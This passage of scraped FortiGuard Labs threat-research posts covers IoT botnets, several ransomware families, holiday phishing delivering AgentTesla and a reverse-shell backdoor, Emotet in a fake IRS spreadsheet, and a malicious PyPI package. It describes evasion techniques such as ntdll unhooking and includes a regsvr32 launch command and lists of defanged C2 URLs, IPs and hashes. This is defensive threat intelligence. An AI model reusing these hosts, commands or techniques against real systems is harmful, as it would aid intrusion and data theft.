and uses WebSockets to communicate with its C2 servers. Another trend that we saw with IoT botnets was the rise of samples written in Golang despite its compiled binaries having relatively much larger file sizes. A Golang ELF binary executable can easily be above 4MB in size, whereas normal Mirai and Gafgyt binaries fall below 300KB. For this reason, some campaigns use the UPX packer to help reduce the file size. Up through October 2022, one of the C2 servers (176[.]65[.]137[.]5) listed in our Zerobot report historically distributed the Mirai-based SORA variant. It then switched to distributing Zerobot the month after. For example, hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 served a UPX-packed SORA binary in October 2022 (Figure 10), but similar URLs with thezero.{arch}filename were later seen distributing Zerobot instead. The switch from distributing SORA to Zerobot, but using the same campaign filename is interesting as these families do not share a common C2 protocol. The intent behind the switch remains unclear. Apart from Zerobot, we are also highlighting several additional Golang botnets caught by our honeypots. In early November 2022, we collected samples of a DDoS botnet that supports only TCP-based DDoS attacks. This botnet is named Rose, based on the source code previously hosted on GitHub. Interestingly, the bot configures ZTE and Huawei devices to prevent their exploitation, similar to the Mozi botnetreportedby Microsoft. We also came across a simple DDoS bot that calls itself “nyancat” (Figure 11), as seen in the path of the source files used to compile the binary. The path also suggests that the bot was compiled in a Windows environment. This bot extends publicly available botnet code on GitHub to perform HTTP-based Denial of Service (DoS) types of attacks on top of existing TCP, UDP, and Valve Source Engine (VSE) attacks. Interestingly, we found another DDoS botnet also compiled in Windows from the same source file base path (Figure 12),C:/Users/Admin/Music. This botnet also looks like an adaptation of another source code on GitHub that supportsHTTP GET, HULK, GoldenEye,TLS and basic TCP and UDP types of DoS attacks (Figure 13). It’s possible that these two samples were compiled by the same threat actor, given that the binaries were built from source code located in similar directories on Windows machines and that some of the functions share similar names and code. Another malware we captured is Panchan (Figure 14), a Golang-based XMRig miner that wasdocumentedby Akamai around June 2022 but with earlier samples found as early as March. IoT malware is very much alive and continues to exploit both old and new vulnerabilities to infect devices and propagate themselves. While most of them target router vulnerabilities, there are notable exceptions, like the popular F5 BIG-IP iControl CVE-2022-1388 and VMware Workspace ONE Access CVE-2022-22954 vulnerabilities. Data from our telemetry also verifies that even old vulnerabilities from 2014 are still being actively exploited. Mirai and Gafgyt-based malware still dominate the IoT threat landscape in terms of the sheer volume of samples. There is also a growing variety of malware written in the Go programming language, possibly fueled by the increasing availability of malware source code in public repositories like GitHub, which makes it easy for unsophisticated threat actors to build and operate their own botnets. With this increased interest in using Golang for malware development, we expect to see even more Golang IoT botnets this year. FortiGuard Labs will continue to track and report on emerging threats and trends in the IoT threat landscape. The FortiGuard Antivirus service detects and blocks these threats as TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. FortiGuard Labs provides IPS signatures against the following vulnerabilities. TheFortiGuard Web FilteringService blocks the C2 servers and download URLs cited in this report. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that work together to provide up-to-date threat intelligence about hostile sources. Files 8332871673d8e9d90c95a463e1bdc73b1fae1a59b46767cab1c0c9257de4e7f5 ebe891df3802d21c34d1821c5c772d77de4c6e71eb84690ec19aecb923a95aca fd47e446e72d7eb6e75f4990c192559c349b92f60fa6f57508fde646cf8317aa 51f45d81f00e65a29b02231e5eba7ac850094fa00172668daf439d28d544717e 038271675df68c56ce147852093fcb795cbde55198d33f4be52d6d102689764d 56ab2c3f334f73b986c64180d5c82d4050a583ff06da0873ff4750be4a02bbaf 8dceacda8288e61769a9ccf6900dff45d500679440b006138d4746ebf15cc664 e2c2a0cccefc4314c110f3c0b887e5008073e607c61e1adde5000efb8e630d50 1c1817e9c32dcf70871505a39d235d0f424f985d13998706ed0ed6aaffc20da6 b4cd314c832f046143d200285dd1fb96f1f7443bc0e3d321614225bf77783160 5f73c66e72118cb2d18ff839e9f94d1d0e1da44a5c76a0972c537652eacf708b Download URLs hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 C2 176[.]65[.]137[.]5 194[.]87[.]84[.]154 threat research,FortiGuards Labs,Internet of Things (IoT),botnet,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/2022-iot-threat-review"
  },
  {
    "title": "Ransomware Roundup – Monti, BlackHunt, and Putin",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and across the OSINT community. The Ransomware Roundup report provides brief insights into the evolvingransomwarelandscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers Monti, BlackHunt, and Putin ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Monti is a relatively new ransomware designed to encrypt files on Linux systems. Files encrypted by Monti ransomware have a \".puuuk” file extension. We are also aware of reports of potential Monti variants that work on Windows systems. Monti drops a ransom note titled “README.txt”. This ransom note resembles that of the infamous Conti ransomware. Unlike typical ransomware, the Monti threat actor operates two separate TOR sites: one for hosting data stolen from victims and another for ransom negotiation. At the time of writing, the ransom negotiation site was not accessible. Thedata leaksite has a “wall of shame,” which the Monti operator may have copied from other ransomware gangs such as Ragnar Locker. Currently, the leak site does not list any victims but has a provocative message that may indicate that many victims of Monti ransomware were “cooperative” and paid ransom, except for one victim in Argentina. The ransomware also drops a text file titled “result.txt”, which shows how many files it has encrypted in the compromised machine. FortiGuard Labs recently came across new variants of the BlackHunt ransomware. This ransomware is relatively new and reportedly accesses victims’ networks through vulnerable Remote Desktop Protocol (RDP) configurations. Files encrypted by BlackHunt ransomware can be identified with the following filename pattern:  [unique ID assigned to each compromised machine].[contact email address].Black. The ransomware also deletes shadow copies, which makes file recovery difficult. The ransomware also drops two ransom notes: one is titled “#BlackHunt_ReadMe.hta” and the other is “#BlackHunt_ReadMe.txt”. Although both ransom notes belong to BlackHunt ransomware, the notes not only include different contact email addresses but the different IDs assigned to each victim as well. The ransom note in HTA format also has a link to a TOR site, which was no longer accessible at the time of the investigation. Putin is a recent ransomware that encrypts files on victims’ machines. It then tries to extort money for decrypting those files and not leaking stolen data to the public. Files encrypted by Putin ransomware have a “.PUTIN” file extension. The ransomware drops a ransom note titled “README.txt”, which states that victims have only two days to make a ransom payment. Otherwise, their encrypted files will not be recovered. This is a common tactic used by many ransomware variants to put pressure on victims to pay a ransom as fast as possible. The ransom note includes two Telegram channels: one for negotiating ransom payment with the Putin ransomware gang and another for releasing data stolen from the victims. At the time of the investigation, the channel used for data leaks lists a Singapore and a Spanish company. However, the dates of the posts only go back to late November 2022, indicating that the Putin ransomware is likely not yet widespread. Fortinet customers are already protected from this malware variant through FortiGuard’s AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known Monti, BlackHunt and Putin ransomware variants with the following AV signatures: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Protection,ransomware,Ransomware Roundup,ransomware prevention,ransomware attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-monti-blackhunt-and-more"
  },
  {
    "title": "Trying to Steal Christmas (Again!)",
    "content": "FortiGuard Labs Threat Research Much of the world’s population observes and celebrates Christmas every December to connect with friends and family and reflect on the year. Malware operators also observe the holiday, perennially attempting to compromise the systems of users who have let their guard down during the festivities. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Malware opens a backdoor and exfiltrates information from compromised machinesSeverity Level:High FortiGuard Labshas come across two holiday-themed phishing examples that exploit people’s interests in the holidays, leading to malware infection and further exploitation. FortiGuard Labs found that an AgentTesla affiliate started Christmas activities early this year. Their email is disguised to look like it came from a jewelry shop in Dubai. It was sent to a company that specializes in water treatment in Chile. The email requests that the recipient provide quotes for the price and availability of jewelry for Christmas. An obvious red flag is that “Dubai” is spelled wrong (besides asking a company specializing in water treatment for jewelry pricing.) The email has two attachments: “new designs.gz” contains “new designs.exe,” and “Inquiry lists.gz” contains “Inquiry lists.exe.” Although the embedded files have different names, they share the same file hash (SHA2: c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5). When executed, c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5 drops fkkvzetzm.exe, jfwxswcu.au3, igqyivch.prc, and kywyozha.x into the %usertemp% directory. It then calls an AutoIt script (jfwxswcu.au3) by launching fkkvzetzm.exe (a legitimate copy ofAutoIt3) with jfwxswcu.au3 as an argument. The file jfwxswcu.au3 is an obfuscated AutoIt script designed to read and deobfuscate igqyivch.prc, which contains shellcode. The shellcode is then loaded into memory via VirtualAlloc. The shellcode, in turn, loads kywyozha.x into memory. Once loaded, kywyozha.x performs several tasks, including launching a copy of the running process and checking to see if it’s running inside a 64bit process. To avoid being detected by system monitors such as AV and EDR, it copies ntdll.dll into memory so it can use that instead of the one on the disk. It then checks to see if specific APIs in ntdll.dll have been modified or hooked withtrampolines. It then finally injects kywyozha.x into the copy of the running process. The file kywyozha.x is an executable file. It calls itself 8845e90c-374f-4f68-a7a8-4bc7bad7be20.exe (SHA2: 0FCAE5DB73D10B022E86F7E0799073623FA5063A29054807E1F93A4016D8FC99). 8845e90c-374f-4f68-a7a8-4bc7bad7be20.exe is a variant of the AgentTesla infostealer Trojan that uses Telegram (hxxps://api.telegram[.]org/bot5018340186:AAFKw8ktzY7O_6e1fhgEWq27H2aE-rsBGjA/) for its Command-and-Control (C2) server. The malware can download and delete files, steal credentials from browsers and FTP and email applications, and performkeylogging Fortunately, the company that received the email is not in the jewelry business and is unlikely to have opened and executed AgentTesla. We also recently came across a strange email with a theme familiar to Christmas movie viewers. The email was crafted to appear as being sent from Klaus Hans Gruber to John McClane - fictional characters from the original Die Hard movie. The email has a heartfelt message requesting to settle their long-time feud and asks the recipient (in this case John McClane) to open the attachment, “good_time.zip.” The archive file contains a series of what appear to be JPEG image files. However, a closer look revealed that “image6” is not actually a JPEG file. Rather than a photo, image6 is a batch file that displays “image7.jpg.jpg” (shown below) and also loads and executes PowerShell code from hxxps://pastebin[.]com/raw/PeJLUFC4. While these PowerShell commands claim to be for “educational purposes,” they create a reverse shell backdoor to the email sender. This backdoor allows for the execution of arbitrary PowerShell commands. The obvious tactic used by the attacker is to get the recipient to go through a set of amusing images attached to the email and inadvertently run the malicious batch file. While the email is crafted as a joke, the attachment can still cause real harm to users by opening a backdoor on compromised machines. While the attacks covered in this blog are not new by any means, such attacks are repeated every year because threat actors believe that “if you take enough shots, you will eventually make a basket.” That’s especially true when attacks exploit things like holidays and major events, like Christmas or the World Cup. Taking advantage of distracted recipients continues to be a successful strategy, and users are cautioned to remain vigilant during the holiday season. To that end, the Cybersecurity and Infrastructure Security Agency (CISA) has created several tips to help users with online safety and handling email attachments. FortiGuard Labs wishes everyone a safe holiday season! The Fortinet Antivirus engine detects all binaries discussed in this blog using the following AV signatures: The FortiGuard Web Filtering service rates the AgentTesla C2 server and the location where malicious PowerShell script is hosted as ‘Malicious’ and blocks them accordingly. FortiMail and FortiSandbox can detect and quarantine the malicious attachments in this campaign, and Fortinet’s CDR (Content Disarm and Reconstruction) service can disable them. In addition to these protections, Fortinet can help train users to understand and detect phishing threats: Our FREENSE trainingprogram—NSE 1 – Information Security Awareness—includes a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. threat research,FortiGuards Labs,email threats,holiday FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/trying-to-steal-christmas-again"
  },
  {
    "title": "Ransomware Roundup – Play",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Play ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Play is a relative newcomer to the ransomware game, having been detected for the first time in June 2022. In this report, Play refers to both the group developing and distributing it and the name of the ransomware executable. Like many other operators in this space, Play has adopted the double-extortion methodology of encrypting endpoints and/or other infrastructure of value within an organization and then threatening to release exfiltrated data from those machines on the internet if a ransom is not paid. Play has been seen to use a number of common methods to gain access to an environment, including phishing, valid compromised accounts, and exposed RDP (Remote Desktop Protocol) servers. Once a beachhead has been established, LOLBINS (Living Off the Land Binaries) are used to explore and then prepare the ground to execute malware on machines of interest. The ransomware executable is Microsoft Visual C++ based and contains several anti-debugging and anti-analysis features to slow investigations into the activity of the malware. These features include garbage code (untethered instructions that serve no useful purpose) and function returns that drive execution into a dead end. When launched, the ransomware encrypts all files of interest, such as personal and operational documents (it does not touch system files), and leaves them with a “.PLAY” extension. When encryption is complete, a ransom note named “ReadMe.txt” is added to the root of the primary drive (e.g., C:\\). This note contains a link to the group’s TOR pages and a contact e-mail address. The “Play News” landing page lists the companies allegedly impacted by Play and a countdown to the possible release of any data gathered by them. Organizations that have refused to pay also have links to their data posted here. There is also a contact portal where the group can be reached, an “FAQ” section that broadly describes what the group has done, and steps for victims to take to restore their data. As of this writing, the “Play News” page lists seven active victims currently being threatened. The regional breakdown of the victims is below: The regional breakdown of victims whose stolen data was leaked is as follows: Based on this information, the Play ransomware threat actors appear to target victims regardless of their region. The one caveat is that enterprises in former Soviet states do not appear to be listed on “Play News”, although this may be coincidental. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Play ransomware variants with the following AV signatures: File-based IOCs: SHA256 f18bc899bcacd28aaa016d220ea8df4db540795e588f8887fe8ee9b697ef819f e641b622b1f180fe189e3f39b3466b16ca5040b5a1869e5d30c92cca5727d3f0 608e2b023dc8f7e02ae2000fc7dbfc24e47807d1e4264cbd6bb5839c81f91934 006ae41910887f0811a3ba2868ef9576bbd265216554850112319af878f06e55 e4f32fe39ce7f9f293ccbfde30adfdc36caf7cfb6ccc396870527f45534b840b 8962de34e5d63228d5ab037c87262e5b13bb9c17e73e5db7d6be4212d66f1c22 5573cbe13c0dbfd3d0e467b9907f3a89c1c133c774ada906ea256e228ae885d5 f6072ff57c1cfe74b88f521d70c524bcbbb60c561705e9febe033f51131be408 7d14b98cdc1b898bd0d9be80398fc59ab560e8c44e0a9dedac8ad4ece3d450b0 dcaf62ee4637397b2aaa73dbe41cfb514c71565f1d4770944c9b678cd2545087 f5c2391dbd7ebb28d36d7089ef04f1bd9d366a31e3902abed1755708207498c0 3e6317229d122073f57264d6f69ae3e145decad3666ddad8173c942e80588e69 dd101db5d9503f33a0c23d79da3642e999375748f7c1532e98c813b114bdfa1a 47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57 703075181922eb8db8d23279eaed8f7263dfa2b64383cff675da4cedc2394af5 f39d6741cbb99a81decbe5e75c07e846b5a36b40bc1bb0c0c61415300cc43b6c 8d94028bfaac5bef84c56b01f40e429ae4cdf799b2b755dfba9eee3b72448b5b f0a3047e9d557e2150501e302d5e96a1c2669858fb0072f97024fe0dd07d5271 8556dfe5582a5647a5e96cd77e6239874504a01a9c7b9e512e70329ec6f61aea 5e94626c6bcb825acede3826811ed693644d6dbb7caeeefb8575c2ec711a65a6 a29e20d89e8c933e05b690b2779f82716fb31f688594b99d868e4382058caa8f 757524b09e5d4f2399172c4ac0f6996ec34dec90110542973d438d5370aff280 3a36e917a4a6587290a393d5b10d0bd42f99cf0c72a2e7de751a4bfaeb9d30c5 92f3abed62d710064a19f2a50c4482cd02adfd821ace4c2f3030f96290166189 157c43a3a4e014827e42cf4dd20cc8efa71cdf098f5d1d04b6cd1a972d6a8c7a 5eca08ddca898427de5ab13fedf25426102c3a0621d086b63f2e37d2d04ba3e9 2b4111121fb35b46665c42e3ea2cf1b8eda5afce580e310465cb259bb1abd053 12d1a0dc37d877dbf81bd18e8bd57b2843cc254c9a3cfcbecb70305612e60cae bb51255ec929ae1fb34981b8b988769027ee49e68c0958a4a2a76b59a0dc1cff 51f44e31b0f3718a5d145a1f77fd79cbd7ff21fecf8bba3181fea019b508cfeb 73e19be4da76bb4e52cb82493c75690977fc3a5f589a9b47e834362545ef512a bbd84d10f6a56bfeca23fd5d11d9e370fdfa91be73aa60c9d460b2671145c109 0ed328af77f2576071bfd543938fc01101daac01f216dc43bc091a8da4aff18d f054f373cead893f868fd9b4acc24f751afefbb80cf961e305f97741f952a641 176476f9d924d83343a51a90ade097d12b7594dc5dbca1771c440047dfbe81eb 957a6aee2437a5c4d31372af2f6bceb29e1c7a49d650fe207cefc624bf6bca82 2e9126dfad03bdaf54f9b29ade42038c83f65ac7288376f45768901660f62d7b 2ab190542c3ec7b2b6e6d4bccce4c5d6a572f98c6bc89b014fea0c8fd6db6723 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-play-ransomware"
  },
  {
    "title": "The Taxman Never Sleeps",
    "content": "FortiGuard Labs Threat Research For most people, taxes are a certainty. In the United States and Canada, tax forms are usually submitted by individuals and businesses in the spring (although, due to COVID,extensions were grantedfor anyone that asked for them). So, our interest was piqued when we came across an e-mail that included a tax form seemingly from the United States Internal Revenue Service (IRS) in early November. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium The e-mailFortiGuard Labsdiscovered was, unsurprisingly, malicious. But whatwasinteresting was that it had been sent by the recently resurgent Emotet group. Emotet (aka, Geodo and Heodo) began life as a banking Trojan but has since morphed into a jack-of-all-trades tool that can exploit several vulnerabilities to compromise its victims. Once it has infected a system, it then typically delivers additional payloads. And because it’s modular, it is easily customizable by its users. This flexibility and resiliency are part of why Emotet has managed to survive at least one coordinated industry/law enforcement takedown in 2021. Although claiming to be from “IRS.gov,” this phishing e-mail originated from an organization’s compromised e-mail account in Pakistan. The subject and body claim that the recipient’s IRS K-1 forms are attached in a Zip archive encrypted with the password “0440”. Schedule K-1is a US federal tax document that reports income, losses, and dividends for a business or financial entity's partners or an S corporation's shareholders to the IRS. Because the content from these forms must be added to an individual’s annual tax form, they must be submitted one month prior (March 15) to the individual income tax submission deadline of April 15. This is why seeing a Schedule K-1 form attached to an email on November 8th was a red flag. A Zip archive, “K-1 form.zip”, and an image of the IRS logo are attached to the email. This “K-1 form.zip” file is an encrypted Zip archive that requires a password to unpack. Its password, “0440”, is included in the body of the e-mail. It allows the “K-1 form.xls” to be opened. Once opened, the file is an Excel spreadsheet with an interesting banner. It exhorts the user “in accordance with the requirements of your security policy” to copy the file into the “Templates” directory of whichever version of Microsoft Office is being used and then relaunching the file. The file has several worksheets (seven in total). Six of those sheets are protected, so they can’t be changed, and the user cannot view their contents directly. As you might suspect, this spreadsheet includes a malicious Excel 4.0 macro. An entry in “Manage Names”—“Excel_BuiltIn_Auto_Open”—is set to execute a command in a cell in the only sheet in the workbook that isn’t protected. A deeper look at Sheet6 shows that column “G” has been hidden. Python scripting reveals more information about how this malicious file functions. Using the Python library “openpyxl”, we could view details hidden in each of the worksheets. As shown inFigure 6, several rows and columns have hidden content. For example, by drilling deeper into the data for “Sheet4,” several URL fragments are revealed. Some further scripting helps piece these fragments together. This reveals four possible download locations for the next stage payload. Depending on which URL is used, the downloaded payload is saved as oxnv1.ooccxx through oxnv4.oocccxx. It then calls and attempts to launch this payload via “regsvr32.exe” using the command “C:\\Windows\\System32\\regsvr32.exe /S ..\\oxnv[n].ooccxx”. This executable is Emotet. The Emotet payload is a Windows Dynamic Link Library (DLL) file. Our analysis shows that it was compiled just before the email for this campaign was sent out. Unusually, this DLL has over 270 export functions! As can be seen in Figure 11, the function names are randomized. The vast majority offer a return to the caller. This appears to be an anti-analysis/anti-debugging method. When executed, “oxnv[n].ooccxx” is copied to a randomly named directory under “C:\\Windows\\System32” and then renamed to an equally random name. The regsvr32.exe process is restarted to use the renamed file in its new location. Once Emotet is up and running, it attempts to contact one of its Command and Control (C2) server nodes. In this case, 20 possible IPs are used (shown in the IOC section below). The malware loops through each sequentially until contact is made. If the attempts are unsuccessful, it pauses and then cycles through again for as long as required. The spectre of the IRS is not a new phishing lure, especially during tax season. Even though the IRS will never initiate contact with taxpayers by email, few things motivate recipients to act (and, as a result, be less cautious) than thinking the IRS has contacted them. This threat is especially interesting because it was delivered outside the usual time frame for tax-based phishing. It is also a warning that when you receive an unusual email like this, it is best to treat it with caution because Emotet and other similar threat actors will be hoping that fear will cause caution to be abandoned. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signatures detect the malware samples mentioned in this blog MSExcel/Agent.DKF!tr.dldr W32/Emotet.PACA!tr The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. File-based IOCs: Filename SHA256 K-1 form.zip be2bb6f684cd23a66667a563a78ebfa43de4bb958dc0465a830229a9b927b714 K-1.xls 8c3cfdd7e1e162129eedf2c3d9f6f63c133622bfe5d04bccbd823486a85b69ed oxnv[n].ooccxx 9efdbe83c874a14282b0105fcec8dc46d9ba1de6496f5d570fa14915b8fd3285 Network-based IOCs: IOC IOC type hXXp://www[.]spinbalence[.]com/admin3693/Z6WQpmNRNj6041fU2zpt/ C2 hXXp://kabaruntukrakyat[.]com/wp-content/ES/ C2 hXXps://chobemaster[.]com/INFECTED/LEdXM4gdwN4mgnlC/ C2 hXXp://cngst[.]com/data/fXWpDbJ3KwAybE/ C2 45[.]235[.]8[.]30:8080 C2 94[.]23[.]45[.]86:4143 C2 119[.]59[.]103[.]152:8080 C2 169[.]60[.]181[.]70:8080 C2 164[.]68[.]99[.]3:8080 C2 172[.]105[.]226[.]75:8080 C2 107[.]170[.]39[.]149:8080 C2 206[.]189[.]28[.]199:8080 C2 1[.]234[.]2[.]232:8080 C2 188[.]44[.]20[.]25:443 C2 186[.]194[.]240[.]217:443 C2 103[.]43[.]75[.]120:443 C2 149[.]28[.]143[.]92:443 C2 159[.]89[.]202[.]34:443 C2 209[.]97[.]163[.]214:443 C2 183[.]111[.]227[.]137:8080 C2 129[.]232[.]188[.]93:443 C2 139[.]59[.]126[.]41:443 C2 110[.]232[.]117[.]186:8080 C2 139[.]59[.]56[.]73:8080 C2 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. threat research,email phishing,FortiGuards Labs,email threats,emotet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/the-taxman-never-sleeps"
  },
  {
    "title": "New Supply Chain Attack Uses Python Package Index “aioconsol”",
    "content": "FortiGuard Labs Threat Research Our team has discovered another 0-day attack embedded in a PyPI package (Python Package Index). This one is called “aioconsol.” It was found on December 9, 2022, by monitoring an open-source ecosystem. This Python package was published on December 6, 2022, as shown in its official PyPI repository. As can be seen, all three versions of this malware were published on the same day. Like the “shaderz” zero-day PyPI attack wediscovered and postedlast week, this malicious package does not include a clear description of its project or source page. Version 2.0 of the package includes malicious code in its setup.py installation script that writes what appears to be a binary to a file called “test.exe” and executes it as a part of its installation. In the previous versions, 1.0 and 0.0, a similar malicious code appears in its __init__.py scripts, as shown below. As shown in the VirusTotal entry below, several vendors flag this binary exe as malicious (SHA 256): 52e6efbbfb1fdeb976e2464c542bc17747d213d67f28dff4d7df0879df23fd7e Let’s jump right into the binary exe and run it. It creates a subprocess called ‘stub.exe.’ It drops a series of files to the folder ‘%USER%\\AppData\\Local\\Temp\\onefile_%PID_%TIME%’, as shown below. This dropped executable ‘stub.exe’ is flagged as malicious by only a handful of vendors (SHA 256): 8124cec491e0249bc4a9f3f9d3755201b0e8c28068ce8c4b528217dbb94afd13 After we run test.exe, we see that it copies itself to ‘%USER%\\AppData\\Local\\WindowsControl’ as ‘Control.exe’ and drops a ‘run.bat’ batch file. The run.bat script shows the path to the file ‘Control.exe,’ which may be used to run it at startup. This is the second malicious zero-day Python Package Index (PyPI) supply chain attack we have discovered in less than a week. This technique is often used because malware authors can store an entire binary executable inside a simple python script. This can have drastic effects, potentially damaging your system and exposing users to vulnerabilities. Individuals and organizations need to be wary of installing python packages in the wild as they may include malware. FortiGuard AntiVirusdetects the malicious executables identified in this report as test.exe:W32/PossibleThreat stub.exe:W32/Agent.AHP!tr The FortiGuard AntiVirus service is supported byFortiGate,FortiMail,FortiClient, andFortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. test.exe 52e6efbbfb1fdeb976e2464c542bc17747d213d67f28dff4d7df0879df23fd7e stub.exe 